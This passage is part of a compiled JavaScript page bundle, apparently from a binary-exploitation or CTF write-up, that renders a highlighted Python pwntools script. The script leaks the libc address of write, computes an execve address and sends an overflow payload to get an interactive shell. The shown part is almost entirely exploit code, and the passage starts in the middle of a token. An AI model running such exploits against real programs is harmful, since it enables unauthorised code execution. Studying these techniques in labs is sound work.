punctuation"}},[s._v(")")]),s._v("\np"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndata "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" p"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nwrite_addr "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" u32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\noffset "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" write_addr "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v(" libc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("symbols"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nexecve_addr "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" offset "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" execve\npayload "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" junk "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("execve_addr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendlineafter"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Input:\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("payload"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br")])])])}),[],!1,null,null,null);t.default=e.exports}}]);